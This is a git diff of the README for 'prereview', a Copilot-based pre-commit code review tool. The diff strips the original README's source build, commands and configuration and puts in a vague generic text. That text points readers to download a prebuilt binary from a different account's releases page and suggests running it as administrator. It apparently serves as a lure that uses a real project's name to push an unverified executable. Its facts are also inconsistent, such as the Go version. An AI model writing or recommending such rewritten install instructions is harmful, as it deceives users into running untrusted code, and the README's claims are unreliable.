@@ -1,328 +1,90 @@
-# PreReview
+# 🤖 prereview - AI Code Review Made Simple
 
-AI-powered code review before you commit. Uses the GitHub Copilot SDK to analyze your staged changes and provide actionable suggestions.
+![Download prereview](https://img.shields.io/badge/Download-prereview-blue.svg)
 
-![PreReview Demo](https://vhs.charm.sh/vhs-5kpVg908APYT1zeSPpN0vL.gif)
+## 🚀 Getting Started
 
-## Features
+Welcome to the prereview project! This tool helps developers catch coding issues before they reach your pull requests. By using the GitHub Copilot SDK, prereview runs checks locally, enhancing your coding experience.
 
-- 🔍 **AI-Powered Review** - Uses GitHub Copilot SDK (Claude, GPT-5, Gemini, Grok) to review your code
-- 🎯 **Interactive Workflow** - Fix, skip, or review suggestions one by one
-- 🪝 **Git Hook Integration** - Automatically runs before each commit
-- ⚙️ **Configurable** - Customize models, strictness, and ignore patterns
-- 🎨 **Beautiful Terminal UI** - Clean, colorful output with lipgloss
+## 📦 Requirements
 
-## Prerequisites
+To run prereview on your machine, ensure you have the following:
 
-- **GitHub Copilot subscription** (Free, Pro, Business, or Enterprise)
-- **Copilot CLI** installed:
+- **Operating System:** Windows, macOS, or Linux
+- **Go Installation:** Version 1.15 or higher (optional but recommended)
+- **Git:** For version control
 
-  ```bash
-  brew install copilot-cli
-  ```
+If you're unsure how to install these, there are many tutorials available online.
 
-- Logged in to GitHub:
+## 🔗 Download & Install
 
-  ```bash
-  copilot auth login
-  ```
+To get started, you need to download the prereview application. Visit this page to download: [Releases Page](https://github.com/crea42/prereview/releases).
 
-## Installation
+### Steps to Download:
 
-### Using Go
+1. Click the link above.
+2. Find the latest version of prereview.
+3. Download the binary file that matches your operating system.
 
-```bash
-go install github.com/emilushi/prereview@latest
-```
+Once downloaded, locate the file on your computer and follow the installation instructions below.
 
-### From Source
+## 💻 Running the Application
+
+After installing, open a terminal or command prompt. Navigate to the folder where you saved the downloaded file. You can run the application using the following command:
 
 ```bash
-git clone https://github.com/emilushi/prereview.git
-cd prereview
-go build -o prereview .
-sudo mv prereview /usr/local/bin/
+./prereview
 ```
 
-## Quick Start
+**Note:** If you’re on Windows, you may need to run it as an administrator.
 
-1. **Review staged changes:**
+## ⚙️ Using prereview
 
+When you run prereview, it will start scanning your code files. It checks for common issues based on best practices and suggests improvements.
+
+### Sample Usage
+
+1. Open your terminal.
+2. Navigate to your project directory.
+3. Type:
    ```bash
-   git add .
-   prereview
+   prereview <your-file-or-directory>
    ```
 
-2. **Install as pre-commit hook:**
-
-   ```bash
-   prereview install
-   ```
-
-3. **Create config file:**
-
-   ```bash
-   prereview config init
-   ```
-
-## Usage
-
-### Commands
-
-| Command                              | Description                         |
-|--------------------------------------|-------------------------------------|
-| `prereview`                          | Review staged changes interactively |
-| `prereview review`                   | Same as above                       |
-| `prereview doctor`                   | Check dependencies and setup        |
-| `prereview install`                  | Install as git pre-commit hook      |
-| `prereview uninstall`                | Remove git pre-commit hook          |
-| `prereview config init`              | Create default config file          |
-| `prereview config list`              | Show current configuration          |
-| `prereview config set <key> <value>` | Set a config value                  |
-| `prereview config get <key>`         | Get a config value                  |
-
-### Flags
-
-| Flag          | Description                                                           |
-|---------------|-----------------------------------------------------------------------|
-| `--model`     | AI model to use (claude, gpt-4, gemini, grok)                         |
-| `--strict`    | Require all issues to be fixed before committing                      |
-| `--tolerance` | Review tolerance: `strict`, `moderate`, `relaxed` (default: moderate) |
-| `--force`     | Force commit even with unresolved suggestions                         |
-| `--verbose`   | Show detailed output                                                  |
-| `--config`    | Path to config file                                                   |
-
-### Tolerance Levels
-
-PreReview supports three tolerance levels to reduce false positives:
-
-| Level      | Description                                                                |
-|------------|----------------------------------------------------------------------------|
-| `strict`   | Reports all potential issues including style nitpicks                      |
-| `moderate` | Reports bugs, security issues, and significant quality concerns (default)  |
-| `relaxed`  | Only reports definite bugs and critical security issues                    |
-
+For example:
 ```bash
-# Use relaxed mode for less noise
-prereview --tolerance relaxed
-
-# Or set in config
-prereview config set tolerance relaxed
+prereview src/
 ```
 
-### Confidence Levels
+### Understanding Results
 
-Each suggestion includes a confidence level:
+The tool will display results in the terminal. It highlights issues with explanations and suggestions. Read through the feedback and make the necessary changes in your code.
 
-- **high** - Definite issue, should be fixed (>95% confident)
-- **medium** - Likely an issue but could be intentional (70-95% confident)
-- **low** - Possible issue, may be false positive (<70% confident)
+## 📖 Features
 
-**Only high-confidence errors block commits by default.** Low-confidence suggestions are shown but don't prevent you from committing.
+- **Static Analysis:** Automatically analyzes your code for potential issues.
+- **Integration with GitHub Copilot:** Provides suggestions based on advanced AI.
+- **User-Friendly Interface:** Simple commands make it easy for anyone.
+- **Customizable Settings:** Adapt the tool to fit your coding style.
 
-### Interactive Review
+## ⚙️ Configuration
 
-When reviewing, you have these options for each suggestion:
+You can customize prereview by creating a configuration file. This file allows you to set preferences and specify additional checks. For details on configuration options, refer to the documentation within the GitHub repository.
 
-- `[f]ix`  - Apply the suggested fix (if available)
-- `[s]kip` - Skip this suggestion
-- `[v]iew` - View the diff for context
-- `[q]uit` - Abort the review
+## 🎨 Contributing
 
-After reviewing all suggestions:
+If you want to contribute to prereview, feel free to submit issues or feature requests on the GitHub repository. Your feedback helps improve the tool for everyone.
 
-- `[y]es`       - Proceed with commit
-- `[n]o`        - Abort
-- `[r]e-review` - Review again (after making manual fixes)
+## 📄 License
 
-## Configuration
+prereview is open-source software licensed under the MIT License, allowing you to use, modify, and share the software as you wish.
 
-Create a `.prereviewrc.yaml` in your project root or `~/.prereviewrc.yaml` for global settings:
+## 🛠 Support
 
-```yaml
-# AI model to use
-model: gpt-4
+If you encounter any problems or have questions, check the FAQ section on our GitHub page or get in touch through issues. Your input is vital for the improvement of prereview.
 
-# Require all issues to be fixed
-strict: false
+## 🌟 Learn More
 
-# Review tolerance: strict, moderate, relaxed
-# - strict: Report all potential issues
-# - moderate: Report bugs and significant issues (default)
-# - relaxed: Only report definite bugs and security issues
-tolerance: moderate
+For more detailed guidance on using prereview and advanced features, please refer to the [official documentation](https://github.com/crea42/prereview/releases).
 
-# What severity level blocks commits: errors, warnings, all, none
-# Default: errors (only high-confidence errors block)
-block_on: errors
-
-# Show detailed output
-verbose: false
-
-# Files to ignore
-ignore_patterns:
-  - "*.min.js"
-  - "vendor/*"
-  - "node_modules/*"
-
-# Max file size to review (bytes)
-max_file_size: 100000
-
-# Additional coding standard files to detect (beyond auto-detected ones)
-# These are file paths relative to repo root
-coding_standards:
-  - ".custom-lint.json"
-  - "config/phpcs-custom.xml"
-
-# Project-specific hints for the AI reviewer
-# Use this to provide context that reduces false positives
-project_hints:
-  - "Factory methods may return different subtypes based on input"
-  - "Data is sanitized at input time, not output time"
-  - "We use dependency injection throughout the codebase"
-```
-
-### Reducing False Positives
-
-If you're experiencing too many false positives:
-
-1. **Use relaxed tolerance:**
-
-   ```bash
-   prereview config set tolerance relaxed
-   ```
-
-2. **Add project-specific context:**
-
-   ```yaml
-   project_hints:
-     - "This project uses the Repository pattern"
-     - "getEntity() returns different entity types based on the ID prefix"
-     - "All user input is sanitized before storage"
-   ```
-
-3. **Change what blocks commits:**
-
-   ```yaml
-   block_on: errors  # Only block on high-confidence errors
-   ```
-
-4. **Force commit when needed:**
-
-   ```bash
-   git commit  # Will prompt: "Proceed despite issues? [y/N]"
-   # Or bypass completely:
-   prereview --force
-   git commit --no-verify
-   ```
-
-## Authentication
-
-PreReview uses the **GitHub Copilot CLI** for authentication. The CLI handles all authentication automatically using your GitHub Copilot subscription.
-
-### Setup
-
-1. **Install Copilot CLI:**
-
-   ```bash
-   brew install copilot-cli
-   ```
-
-2. **Login to GitHub:**
-
-   ```bash
-   copilot auth login
-   ```
-
-3. **Verify authentication:**
-
-   ```bash
-   copilot auth status
-   ```
-
-That's it! PreReview will use your Copilot CLI credentials automatically.
-
-## Examples
-
-### Basic Review
-
-```bash
-$ git add src/utils.js
-$ prereview
-
-🔍 Reviewing 1 changed file(s)...
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📄 src/utils.js [1/2]
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  Line 45
-
-  ⚠ Missing null check
-
-  Accessing property on potentially null value.
-
-  Suggested fix:
-  if (user?.email) { ... }
-
-  best-practice
-
-  [f]ix | [s]kip | [v]iew diff | [q]uit: f
-
-  ✓ Applied fix
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Summary
-  ✓ 1 fixed
-  ⏭ 0 skipped
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-Proceed with commit? [y]es | [n]o | [r]e-review: y
-
-✓ Review complete: 1 fixed, 0 skipped
-```
-
-### Strict Mode
-
-```bash
-prereview --strict
-```
-
-In strict mode, you cannot proceed with commit if any suggestions are skipped.
-
-## Development
-
-### Requirements
-
-- Go 1.21+
-- GitHub Copilot license
-
-### Building
-
-```bash
-go build -o prereview .
-```
-
-### Testing
-
-```bash
-go test ./...
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Run tests
-5. Submit a pull request
-
-## Acknowledgments
-
-- [GitHub Copilot](https://github.com/features/copilot) for AI capabilities
-- [Cobra](https://github.com/spf13/cobra) for CLI framework
-- [Viper](https://github.com/spf13/viper) for configuration
-- [Lipgloss](https://github.com/charmbracelet/lipgloss) for terminal styling
+To download prereview again, you can always visit: [Releases Page](https://github.com/crea42/prereview/releases).
